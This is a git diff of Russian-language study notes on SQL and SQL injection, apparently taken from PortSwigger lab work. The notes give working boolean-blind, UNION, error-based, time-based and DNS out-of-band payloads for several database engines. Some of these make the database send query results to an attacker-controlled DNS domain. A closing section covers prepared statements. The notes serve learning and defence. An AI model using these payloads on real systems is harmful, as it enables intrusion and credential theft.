@@ -1,4 +1,5 @@
 ====== SQL sheet =======
+Дополнительно : https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 SELECT -
 	Позволяет выбрать строки/столбцы из бд
@@ -14,7 +15,7 @@ SELECT -
 WHERE -
 	позволяет фильтровать строки 
 	
-	SELECT * FROM table WHERE fieldX == 'content' - вытащить все строки у которых fieldX = 'content'
+	SELECT * FROM table WHERE fieldX = 'content' - вытащить все строки у которых fieldX = 'content'
 	
 	 Операторы сравнения :
 	 
@@ -145,7 +146,7 @@ ORDER BY -
 	
 	Очевидно, что для этого так же работает сортировки, лимиты, комбинирование лог. выражений и тд
 	
-==== ОПЕРАТОР ПОДСТРОКИ ==== SQL INJECTION ====
+==== ОПЕРАТОР ПОДСТРОКИ ==== SQL INJECTION ==== BLIND INJECTION (BOOLEAN BASED) ====
 
 	SUBSTR(field, start_pos, how_many)
 	
@@ -165,7 +166,7 @@ ORDER BY -
 	4) Когда буква подобрана, меняем инкрементируем второй аргумент (или первый, тогда достаточно проверять по 1 букве) SUBSTR чтобы проверить следующую позицию. Дальше logout. Затем проделываем так пока не достигнем найденной во 2м пункте длины
 	
 	
-==== ОПРЕДЕЛЕНИЕ КОЛИЧЕСТВА ПОЛЕЙ В ОТВЕТЕ ====
+==== ОПРЕДЕЛЕНИЕ КОЛИЧЕСТВА ПОЛЕЙ В ОТВЕТЕ ==== UNION INJECTION ====
 
 	Через сортировку : 
 	
@@ -209,7 +210,7 @@ ORDER BY -
 ==== ОПРЕДЕЛЕНИЕ МЕТАДАННЫХ СУБД ====
 
 	Чтобы UNION атака была осмысленной, нам необходимо знать сигнатуру столбцов и их типы данных, в этом может помочь специальный объект
-	p.s. это сработает на не-Oracle-based СУБД
+	p.s. это сработает на не-Oracle-based СУБД (см. читшит по ссылке сверху)
 	
 	information_schema
 
@@ -237,3 +238,168 @@ ORDER BY -
 	Ну и финальный payload : 
 	
 	Lifestyle'+AND+1=2+UNION+SELECT+username_mceijz,password_ovkous+FROM+users_dugufm+WHERE+username_mceijz+LIKE+'admin%'--
+
+==== SELECT CASE (ERROR BASED) ==== BLIND ====
+
+	Когда сервер особо не демонстрирует результат того или иного sql запроса, мы можем воспользоваться атакой с опорой на ошибки сервера
+	Как правило, когда сервер не может обработать запрос, он возвращает код 5XX
+	Искусственно собрав заведомо необрабатываемый запрос мы можем получить некоторую информацию о содержимом базы данных
+	
+	SELECT CASE WHEN (CONDITION) THEN (IS_TRUE) ELSE (IS_FALSE) END 
+	
+	Запрос такого типа позволяет явно выбрать "дополнительное" условие для запроса, если сервер уязвим к подобного рода инъекциям
+	
+	Например, если сервер полагается на куки или любой другой заголовок, хоть даже аргумент для .php скрипта, мы можем им манипулировать
+	Тогда дополнение к этому полю будет выглядеть примерно так (с точностью до кавычек):
+	
+	' AND (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='admin')=10) THEN 1/0 ELSE 'a' END)='a
+	
+	Меняя значение справа от равно в условии мы будем получать 2 (или больше, но по сути своей 2) вида различных респонсов :
+	
+	200 - успех
+	500 - ошибка на сервере
+	
+	В зависимости от чего можем сделать вывод о том, угадали ли мы длину пароля или нет (При делении на нуль будет ошибка)
+	То есть если длина верная, пробуем делить на нуль => ошибка, иначе 'a'='a', все ок
+	
+	Стоит заметить расстановку скобок - любое выражение, которое раскрывается в примитив, следует оборачивать в скобки для корректной обработки
+	
+	Пример payload'а для подбора пароля
+	
+	' AND (SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username='admin'), 1, 1))='a') THEN 1/0 ELSE 'a' END)='a
+	
+	Меняя индекс начала и символ мы можем поделить на нуль и получить ошибку <=> найти символ на текущей позиции
+	
+	Вот пример прямиком с портсвиггера :
+	
+	' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1)='m') THEN 1/0 ELSE 'a' END FROM Users)='a
+	
+	На некоторых СУБД, например Oracle есть небольшая специфика в данном кейсе :
+	
+	- SELECT всегда требует FROM, ну тут у нас есть заглушка dual
+	- Сравнение должно происходить между операндами одинаковых типов, поэтому надо кастить 1/0 к строкe через TO_CHAR(1/0)
+	и т.д.
+	
+	Их можно найти в читшите на портсвиггере по ссылке сверху
+
+==== CAST ====
+
+	Если сервер подробно логирует ошибку на клиент, то при известном содержимом БД (сигнатура таблиц и тд)
+	и наличии sqli уязвимости мы можем воспользоваться :
+	
+	CAST (EXPRESSION) AS int
+	
+	Эта запись пытается кастить выражение к типу данных справа от int и если под expression находится строка, то 
+	интерпретатор подробно выведет ошибку о невозможности каста и объяснит причину, показав все expression
+	Таким образом, если мы соберем payload примерно таким образом :
+	
+	SELECT * FROM trackings WHERE trackingid='smth' AND (CAST((SELECT username FROM users LIMIT 1) AS int))=1--'
+						      ^ старт payload				    конец payload ^
+	
+	то в выводе будет что то типа :
+	
+	ERROR: invalid input syntax for type integer: "administrator"
+	
+	p.s. если длина запроса ограничена, то можно пользоваться различными хитростями чтобы сделать его валидным относительно данных
+	и невалидным с точки зрения интерпретатора, то есть мы получим 1 строчку с 1 колонкой username идущего первого в списке,
+	но закастить эту строчку к int'у СУБД не сможет
+	
+	Таким образом, мы можем угнать учетные данные хотя бы кого то одного, заслав следом 
+	
+	SELECT * FROM trackings WHERE trackingid='smth' AND (CAST((SELECT password FROM users LIMIT 1) AS int))=1-- '
+	
+	ERROR: invalid input syntax for type integer: "cyb71gtg0elt9bc8knxe"
+
+	Если же примитив записи больше, можно более метко "выстреливать юзеров" через WHERE :
+	
+	SELECT * FROM trackings WHERE trackingid='smth' AND (CAST((SELECT password FROM users WHERE username='administrator') AS int))=1-- '
+
+==== TIME BASED ====
+
+	Если сервер не возвращает в респонсе ошибку в любых ее проявлениях, но обрабатывает запросы последовательно
+	(Не асинхронно), и уязвим к инъекциям, можно воспользовать time-based атакой.
+	Это значит, что если наш запрос будет "истинный" в нашем понимании, то при ответе будет задержка.
+	Этот тип достаточно специфичен, поэтому нужно знать тип конкретной СУБД. 
+	Вот пример задержки для PostgreSQL :
+
+		SELECT * FROM users WHERE login='admin' AND (SELECT CASE((SUBSTR((SELECT password FROM users WHERE login='admin'), 1, 1))='a') THEN pg_sleep(10) ELSE pg_sleep(0) END) IS NULL -- ' AND password='';
+						 ^ payload start														       payload end ^	
+		
+	IS позволяет сравнивать "не примитивы", а так как NULL совместим со всеми типами, то можно прописать IS NULL чтобы выражение слева от AND было логическим.
+	Таким образом, если мы угадали символ в пароле, то будет вызвана функция pg_sleep(10), что сделает на сервере задержку на 10 секунд.
+	
+	Вот примеры для остальных СУБД :
+	
+	MySQL : 	SELECT * FROM users WHERE login='admin' AND IF(((SUBSTR((SELECT password FROM users WHERE login='admin'), 1, 1))='a'), SLEEP(10), 0) -- ' AND password='';
+	Microsoft : 	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10';
+	Oracle :  	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual;
+	
+==== DNS LOOKUP ====
+
+	Если сервер выполняет асинхронно, то мы не увидим задержки в ответах. Запрос можен быть прислан позже,
+	но в таком случае нужно "знать где слушать", поэтому чаще используется атака out-of-band 
+	Она подразумевает собрать payload так, чтобы СУБД сама отправила DNS запрос к DNS серверу, где мы контролируем ip (домен) резолвера
+	
+	Эта техника так же специфична для каждой СУБД поэтому имеет разный синтаксис. Вот примеры :
+	
+	Oracle 	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.DNS-RESOLVER-DOMAIN/"> %remote;]>'),'/l') FROM dual
+	
+	Microsoft 	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.DNS-RESOLVER-DOMAIN/a"') create OR replace function f() returns void as $$ declare c text;
+			declare p text;
+			begin
+			
+	PostgreSQL 	SELECT into p (SELECT YOUR-QUERY-HERE);
+			c := 'copy (SELECT '''') to program ''nslookup '||p||'.DNS-RESOLVER-DOMAIN''';
+			execute c;
+			END;
+			$$ language plpgsql security definer;
+			SELECT f();
+
+	MySQL 		SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\DNS-RESOLVER-DOMAIN\a'
+	
+	Как правило подходы к out-of-band являются отдельными запросами и не имеют общего с основным query. 
+	Поэтому следует воспользоваться stored query (aka second-order) через ";" для накапливания запросов и их последовательного исполнения
+	Но это будет возможно только если сервер позволяет использовать такие запросы, потому что обычно stored query отключен.
+	
+==== DIFFERENT QUERY CONTEXT ====
+
+	Запросы к СУБД могут парситься не только из "сырых" полей ввода. К примеру, запрос к серверу может состоять из XML пакета.
+	
+	Например : 
+	
+	<Order>
+		<OrderID>
+			1
+		</OrderId>
+		
+		<OrderAmount>
+			1000
+		</OrderAmount>
+	</Order>
+	
+	Ничего не мешает нам изменить содержимое полей OrderID & OrderAmount, главное не напутать с кавычками
+	Так как СУБД может интерпретировать числовые данные как строки, например, или же оставлять их числами
+	Все зависит от того как создавали БД (PRIMARY KEY может быть CHAR/VARCHAR; INT и тд)
+	
+	Так же передача в виде XML может помочь обойти некоторые парсеры, которые мониторят ключевые слова в query
+	
+		SELECT, UNION, AND, OR, -- и тд.
+		
+	Через XML/HTML encoding. Это делается либо через ключевые слова (&apos; == ') либо через ascii кодировку (&#x61; = a)
+	То есть заменив некоторые символы на их коды, можно обмануть парсер если он примитивно настроен.
+	
+==== SQLi PREVENTION ====
+
+	Если сервер написан на java, то там есть хороший метод состояния "готовности" таблицы (prevent station) получить поле или другие данные для поиска
+	Что в отличие от конкатенации \ форматных строк позволяет обезопасить СУБД от инъекций. 
+	Это значит, что сначала СУБД обрабатывает весь запрос вместе с ключевыми словами, а потом вставляет input как строку. 
+	Можно представить это как .textContent вместо .innerHTML
+	
+	PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
+	statement.setString(1, input);
+	ResultSet resultSet = statement.executeQuery();
+	
+	На php тоже есть способы реализации prevent station.
+	
+	Однако это не делает сервер абсолютно неуязвимым, например если есть запросы с параметризацией ORDER BY, то конкатенация там часто неизбежна
+	Поэтому нужно делать дополнительную валидацию на сервере, а не просто полагаться на интерпретатор СУБД
